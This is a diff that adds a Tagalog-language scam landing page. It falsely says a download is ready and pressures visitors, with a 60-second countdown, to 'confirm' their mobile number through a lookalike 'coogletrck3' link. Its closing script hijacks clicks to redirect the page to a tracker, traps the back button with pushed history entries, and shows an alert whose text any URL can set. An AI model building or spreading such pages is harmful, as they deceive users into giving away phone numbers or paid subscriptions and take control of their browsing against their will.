@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="tl-ph">
+<head>
+<base href="../">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>(1) Abiso</title>
+<style>
+select:-moz-focusring {color:transparent;text-shadow:0 0 0 #000;}
+    a:focus,a:active,button::-moz-focus-inner,input[type="reset"]::-moz-focus-inner,input[type="button"]::-moz-focus-inner,input[type="submit"]::-moz-focus-inner,select::-moz-focus-inner,input[type="file"]>input[type="button"]::-moz-focus-inner {border:0;outline:0;}
+    textarea,input,input[type="text"],input[type="button"],input[type="submit"],input[type="image"] {-webkit-appearance:none;opacity:1;outline:0;}
+    button {-webkit-appearance:none;outline:none;border:none;}
+    a {text-decoration:none;}
+    .wrapper {margin:0 auto;text-align:center;}
+    .show {display:block;}
+    .hide {display:none;}
+    .clear {clear:both;}
+    .ltr {direction:ltr;display:inline-block;}
+    .rtl {direction:rtl;display:inline-block;}
+	*, *:before, *:after {-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;}
+    body {
+        margin:0; padding:0; width:100%; height:100%;
+        font-family:'Roboto', Arial, Helvetica, sans-serif; font-size:16px; color:#4a4d51;
+        background:#fff;
+    }
+    .wrap { padding:40px 10px; }
+    .imgpict { margin:0 auto 25px; width:100%; max-width:172px; }
+    .txt0 { color:#242629; font-size:30px; line-height:36px; font-weight:700; }
+    .contentwrap {
+        margin:32px auto; max-width:385px; padding:40px 10px;
+        border-radius:10px; -moz-border-radius:10px; -webkit-border-radius:10px;
+        background-color:#fff; border:1px solid #e0e0e0;
+    }
+    .txt { font-size:22px; line-height:24px; font-weight:700; }
+    .txt1 { padding:20px 0; font-size:18px; line-height:22px; font-weight:400; }
+    .txt2 { font-size:16px; line-height:20px; font-weight:400; }
+    .txt3 { font-size:16px; line-height:20px; font-weight:400; }
+    .txt3 span a { text-decoration:underline; color:#4aae00; }
+    .btnclick {
+        margin:0 auto; max-width:150px;
+        animation:shake 10s linear infinite; -webkit-animation:shake 10s linear infinite; -moz-animation:shake 10s linear infinite;
+    }
+    @-moz-keyframes shake {
+        2%, 6%, 10%, 14%, 18% { -moz-transform: translate3d(-5px, 0, 0); }
+        4%, 8%, 16%, 12% { -moz-transform: translate3d(5px, 0, 0); }
+        18.1% { -moz-transform: translate3d(0px, 0, 0); }
+    }
+    @-webkit-keyframes shake {
+        2%, 6%, 10%, 14%, 18% { -webkit-transform: translate3d(-5px, 0, 0); }
+        4%, 8%, 16%, 12% { -webkit-transform: translate3d(5px, 0, 0); }
+        18.1% { -webkit-transform: translate3d(0px, 0, 0); }
+    }
+    @keyframes  shake {
+        2%, 6%, 10%, 14%, 18% { transform: translate3d(-5px, 0, 0); }
+        4%, 8%, 16%, 12% { transform: translate3d(5px, 0, 0); }
+        18.1% { transform: translate3d(0px, 0, 0); }
+    }
+    .btnclick:hover { animation-play-state:paused; -webkit-animation-play-state:paused; -moz-animation-play-state:paused; }
+    .button {
+        width:100%; padding:12px 0; display:inline-block; cursor:pointer;
+        color:#4a4d51; text-align:center; text-decoration:none; font-weight:500; font-size:18px;
+        border:1px solid #e2e2e2;
+        border-radius:5px; -moz-border-radius:5px; -webkit-border-radius:5px;
+        box-shadow:0 4px 0 #d6d6d6; -webkit-box-shadow:0 4px 0 #d6d6d6; -moz-box-shadow:0 4px 0 #d6d6d6;
+        background:-moz-linear-gradient(top, #f2f2f2 0%, #f2f2f2 100%);
+        background:-webkit-linear-gradient(top, #f2f2f2 0%, #f2f2f2 100%);
+        background:-o-linear-gradient(top, #f2f2f2 0%, #f2f2f2 100%);
+        background:-ms-linear-gradient(top, #f2f2f2 0%, #f2f2f2 100%);
+        background:linear-gradient(to bottom, #f2f2f2 0%, #f2f2f2 100%);
+        filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#f2f2f2', endColorstr='#f2f2f2', GradientType=0);
+        background-color:#f2f2f2;
+        -webkit-transition:all 0.1s; -moz-transition:all 0.1s; transition:all 0.1s;
+    }
+    .button:active {
+        position:relative; top:2px;
+        box-shadow:0 1px 0 #d6d6d6; -webkit-box-shadow:0 1px 0 #d6d6d6; -moz-box-shadow:0 1px 0 #d6d6d6;
+    }
+    @media  only screen and (max-width:500px) {
+        .txt0 { font-size:26px; line-height:32px; }
+        .txt2, .txt3 { font-size:15px; line-height:19px; }
+    }
+</style>
+</head>
+<body>
+<div class="wrapper">
+	<div class="wrap"><img class="imgpict" src="pict.jpg" alt="" />
+		<div class="txt0">Handa na ang Iyong Pag-download</div>
+		<div class="contentwrap">
+			<div class="txt">Kumpirmahin ang iyong mobile number sa loob
+				<span id="cdown4948"></span>
+				<script>
+				    document.addEventListener("DOMContentLoaded", () => {
+					    countdown("cdown4948", 60, "s", "");
+                    });
+				</script>
+				segundo
+			</div>
+			<div class="txt1"></div>
+			<div class="btnclick"><a href="https://coogletrck3.com/click.php?lp=1" class="button mainButton">Kumpirmahin Ngayon</a></div>
+		</div>
+		<div class="txt2"><span style="font-size: 12px;">&copy; #1 Taga-download ng Nilalaman</span></div>
+	</div>
+</div>
+<script>
+function _nn(n){
+	return n > 9 ? "" + n: "0" + n;
+}
+function countdown(elementName,seconds,format,redirect=false)
+{
+	if(format=="s")
+	{
+		var counter_inter = setInterval(function(){
+			document.getElementById(elementName).innerText = _nn(seconds--);
+			if(seconds<0)
+			{
+				clearInterval(counter_inter);
+				if(redirect)
+				{
+					window.location = redirect;
+				}
+			}
+		}, 1000);
+	}
+	if(format=="m")
+	{ 
+		var counter_inter = setInterval(function(){
+			seconds--;
+			var m =  parseInt(seconds/60);
+			var s = seconds-(m*60);
+			document.getElementById(elementName).innerText = _nn(m)+":"+_nn(s);
+			if(seconds<=0)
+			{
+				clearInterval(counter_inter);
+				if(redirect)
+				{
+					window.location = redirect;
+				}
+			}
+		}, 1000);
+	}	
+	if(format=="h")
+	{ 
+		var counter_inter = setInterval(function(){
+			seconds--;
+			h = Math.floor(seconds / 3600);
+			m = Math.floor((seconds / 60) % 60);
+			s = seconds % 60;	
+			document.getElementById(elementName).innerText = _nn(h)+":"+_nn(m)+":"+_nn(s);
+			if(seconds<=0)
+			{
+				clearInterval(counter_inter);
+				if(redirect)
+				{
+					 document.location  = redirect;
+					 //alert(redirect);
+				}
+			}
+		}, 1000);
+	}	
+}
+</script>
+<script>
+var cta = 'mainButton';
+var back = 'https://08deh.bemobtrcks.com/go/a60af6bb-ff47-4a71-963e-f5cdb4fbf173';
+var under = 'https://08deh.bemobtrcks.com/go/d8a08998-4942-4993-8fdd-f60630b83eb1';
+if(typeof under!=="undefined"&&under!==null){if(typeof cta!=="undefined"&&cta!==null){document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'&&target.classList.contains(cta)){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}else{document.addEventListener('click',function(event){var target=event.target;while(target){if(target.tagName==='A'){const linkHref=target.href;event.preventDefault();window.open(linkHref,'_blank');window.location.replace(under);break;}
+target=target.parentNode;}});}}
+if(typeof back!=="undefined"&&back!==null){!(function(){var t;try{const URL=window.location.href.split(/[#]/)[0];for(t=0;10>t;++t)history.pushState({},'',URL+'#');onpopstate=function(event){event.state&&location.replace(back);};}catch(o){console.log(o);}})();}
+function getURLParameter_location(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.search)||[,null])[1]||"")}function getURLParameter_hash(e){return decodeURI((RegExp(e+"=(.+?)(&|$)").exec(location.hash)||[,null])[1]||"")}function getURLParameter(e){var a=null;return getURLParameter_hash(e)?getURLParameter_hash(e):getURLParameter_location(e)} if( getURLParameter('alert') ){ setTimeout( function(){ alert( getURLParameter('alert') ) }, 500 ); }</script>
+</body>
+</html>
